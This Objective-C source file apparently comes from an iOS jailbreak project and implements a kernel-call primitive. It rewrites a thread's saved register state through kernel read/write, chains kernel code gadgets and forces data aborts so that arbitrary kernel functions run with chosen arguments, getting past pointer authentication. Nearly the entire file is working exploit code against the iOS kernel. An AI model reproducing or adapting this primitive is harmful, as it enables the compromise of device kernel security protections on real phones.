#import "kcall.h"

#import <stdint.h>
#import <stdbool.h>
#import <mach/mach.h>
#import "pplrw.h"
#import "util.h"
#import "jailbreakd.h"
#import "boot_info.h"

typedef struct {
    uint64_t unk;
    uint64_t x[29];
    uint64_t fp;
    uint64_t lr;
    uint64_t sp;
    uint64_t pc;
    uint32_t cpsr;
    // Other stuff
    uint64_t other[70];
} kRegisterState;

typedef struct {
    bool inited;
    thread_t gExploitThread;
    uint64_t gScratchMemKern;
    volatile uint64_t *gScratchMemMapped;
    arm_thread_state64_t gExploitThreadState;
    uint64_t gSpecialMemRegion;
    uint64_t gIntStack;
    uint64_t gOrigIntStack;
    uint64_t gReturnContext;
    uint64_t gACTPtr;
    uint64_t gACTVal;
    uint64_t gCPUData;
} exploitThreadInfo;

typedef struct {
    thread_t thread;
    uint64_t actContext;
    kRegisterState signedState;
    uint64_t kernelStack;
    kRegisterState *mappedState;
    uint64_t scratchMemory;
    uint64_t *scratchMemoryMapped;
} Fugu14KcallThread;

static void* gThreadMapContext;
static uint8_t* gThreadMapStart;
static Fugu14KcallThread gFugu14KcallThread;
KcallStatus gKCallStatus = kKcallStatusNotInitialized;

#define MEMORY_BARRIER asm volatile("dmb sy");

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;

uint64_t getUserReturnThreadContext(void) {
    if (gUserReturnThreadContext != 0) {
        return gUserReturnThreadContext;
    }
    
    arm_thread_state64_t state;
    bzero(&state, sizeof(state));
    
    arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
    for (size_t i = 0; i < 29; i++) {
        state.__x[i] = 0xDEADBEEF00ULL | i;
    }
    
    thread_t chThread = 0;
    kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT, &chThread);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] getUserReturnThreadContext: Failed to create return thread!");
        return 0;
    }
    
    thread_suspend(chThread);
    
    uint64_t returnThreadPtr = task_get_first_thread(self_task());
    if (returnThreadPtr == 0) {
        NSLog(@"[-] getUserReturnThreadContext: Failed to find return thread!");
        return 0;
    }
    
    uint64_t returnThreadACTContext = thread_get_act_context(returnThreadPtr);
    if (returnThreadACTContext == 0) {
        NSLog(@"[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
        return 0;
    }
    
    gUserReturnThreadContext = returnThreadACTContext;
    
    return returnThreadACTContext;
}

uint64_t Fugu14Kcall_onThread(Fugu14KcallThread *callThread, uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
{
    // Restore signed state first
    kwritebuf(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
    
    // Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
    uint64_t str_x0_x19_ldr_x20 = bootInfo_getSlidUInt64(@"str_x0_x19_ldr_x20");
    
    // x1 -> new pc
    // x3 -> new lr
    kwrite64(callThread->actContext + offsetof(kRegisterState, x[1]), func);
    kwrite64(callThread->actContext + offsetof(kRegisterState, x[3]), str_x0_x19_ldr_x20);
    
    // New state
    // x19 -> Where to store return value
    callThread->mappedState->x[19] = callThread->scratchMemory;
    
    // x20 -> NULL (to force data abort)
    callThread->mappedState->x[20] = 0;
    
    // x22 -> exceptionReturn
    callThread->mappedState->x[22] = bootInfo_getSlidUInt64(@"exception_return");
    
    // Exception return expects a signed state in x21
    callThread->mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
    
    // Also need to set sp
    callThread->mappedState->sp = callThread->kernelStack;
    
    // Set args
    callThread->mappedState->x[0] = a1;
    callThread->mappedState->x[1] = a2;
    callThread->mappedState->x[2] = a3;
    callThread->mappedState->x[3] = a4;
    callThread->mappedState->x[4] = a5;
    callThread->mappedState->x[5] = a6;
    callThread->mappedState->x[6] = a7;
    callThread->mappedState->x[7] = a8;
    
    // Reset flag
    gUserReturnDidHappen = 0;
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Run the thread
    thread_resume(callThread->thread);
    
    // Wait for flag to be set
    while (!gUserReturnDidHappen) ;
    
    // Stop thread
    thread_suspend(callThread->thread);
    thread_abort(callThread->thread);
    
    // Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Copy return value
    return callThread->scratchMemoryMapped[0];
}

uint64_t kcall(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
{
	if (gKCallStatus != kKcallStatusFinalized) return 0;
	return Fugu14Kcall_onThread(&gFugu14KcallThread, func, a1, a2, a3, a4, a5, a6, a7, a8);
}

uint64_t initPACPrimitives(uint64_t kernelAllocation)
{
    if (gKCallStatus != kKcallStatusNotInitialized || kernelAllocation == 0) {
        return 0;
    }

    bootInfo_setObject(@"pac_kernel_allocation", @(kernelAllocation));

	thread_t thread = 0;
    kern_return_t kr = thread_create(mach_task_self_, &thread);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] setupFugu14Kcall: thread_create failed!");
        return false;
    }
    
    // Find the thread
    uint64_t threadPtr = task_get_first_thread(self_task());
    if (threadPtr == 0) {
        NSLog(@"[-] setupFugu14Kcall: Failed to find thread!");
        return false;
    }

    // Get it's state pointer
    uint64_t actContext = thread_get_act_context(threadPtr);
    if (threadPtr == 0) {
        NSLog(@"[-] setupFugu14Kcall: Failed to get thread ACT_CONTEXT!");
        return false;
    }

	// Map in previously allocated memory for stack (4 Pages)
	gThreadMapContext = mapInRange(kernelAllocation, 4, &gThreadMapStart);
    if (!gThreadMapContext)
    {
        NSLog(@"ERROR: gThreadMapContext lookup failure");
    }

	// stack is at middle of allocation
	uint64_t stack = kernelAllocation + 0x8000ULL;

	// Write context

	uint64_t str_x8_x9_gadget = bootInfo_getSlidUInt64(@"str_x8_x9_gadget");
    uint64_t exception_return_after_check = bootInfo_getSlidUInt64(@"exception_return_after_check");
    uint64_t brX22 = bootInfo_getSlidUInt64(@"br_x22_gadget");

	// Write register values
    kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
    kwrite32(actContext + offsetof(kRegisterState, cpsr),  get_cspr_kern_intr_dis());
    kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
    kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
    kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);

    // Use str x8, [x9] gadget to set TH_KSTACKPTR
    kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
    kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + bootInfo_getUInt64(@"TH_KSTACKPTR"));

    // SP and x0 should both point to the new CPU state
    kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
    kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);

    // x2 -> new cpsr
    // Include in signed state since it is rarely changed
    kwrite64(actContext + offsetof(kRegisterState, x[2]), get_cspr_kern_intr_en());

	kRegisterState *mappedState = (kRegisterState*)((uintptr_t)gThreadMapStart + 0x8000ULL);

	gFugu14KcallThread.thread              = thread;
	gFugu14KcallThread.kernelStack         = stack;
    gFugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
    gFugu14KcallThread.mappedState         = mappedState;
    gFugu14KcallThread.actContext          = actContext;
    gFugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t)gThreadMapStart + 0xF000ULL);

    gKCallStatus = kKcallStatusPrepared;

	return actContext;
}

void finalizePACPrimitives(void)
{
    if (gKCallStatus != kKcallStatusPrepared) {
        return;
    }

	// When this is called, we except actContext to be signed,
	//  so we can continue to finish setting up the kcall thread

	uint64_t actContext = gFugu14KcallThread.actContext;
	thread_t thread = gFugu14KcallThread.thread;

	kRegisterState *mappedState = (kRegisterState*)((uintptr_t)gThreadMapStart + 0x8000ULL);

	// Create a copy of signed state
    kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));

    // Save signed state for later generations
    NSData *signedStateData = [NSData dataWithBytes:&gFugu14KcallThread.signedState length:sizeof(kRegisterState)];
    bootInfo_setObject(@"pac_signed_state", signedStateData);

	// Set a custom recovery handler
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid = bootInfo_getSlidUInt64(@"hw_lck_ticket_reserve_orig_allow_invalid") + 4;
    
    // x1 -> new pc
    // x3 -> new lr
    kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
    // We don't need lr here

	// New state
    // Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
    mappedState->x[0] = 0;
    
    // Fault handler is br x22 -> set x22
    mappedState->x[22] = bootInfo_getSlidUInt64(@"exception_return");
    
    // Exception return expects a signed state in x21
    mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
    
	// Also need to set sp
    mappedState->sp = gFugu14KcallThread.kernelStack;
    
    // Reset flag
    gUserReturnDidHappen = 0;

	// Sync all changes
    // (Probably not required)
    MEMORY_BARRIER
    
    // Run the thread
    thread_resume(thread);
    
    // Wait for flag to be set
    while (!gUserReturnDidHappen) ;
    
    // Stop thread
    thread_suspend(thread);
    thread_abort(thread);
    
    // Done!
    // Thread's fault handler is now set to the br x22 gadget
    gKCallStatus = kKcallStatusFinalized;

    //PACInitializedCallback();
}

/*void recoverPACPrimitivesIfPossible(void)
{
    if (gPPLRWStatus != kPPLRWStatusInitialized) return;

    uint64_t kernelAllocation = bootInfo_getUInt64(@"pac_kernel_allocation");
    NSData *kernelSignedState = bootInfo_getData(@"pac_signed_state");

    // Quit if not recoverable
    if (!kernelAllocation || !kernelSignedState) return;

    uint64_t actContextKptr = initPACPrimitives(kernelAllocation);
    kwritebuf(actContextKptr, kernelSignedState.bytes, kernelSignedState.length);

    finalizePACPrimitives();
}*/

void destroyPACPrimitives(void)
{
	// TODO
}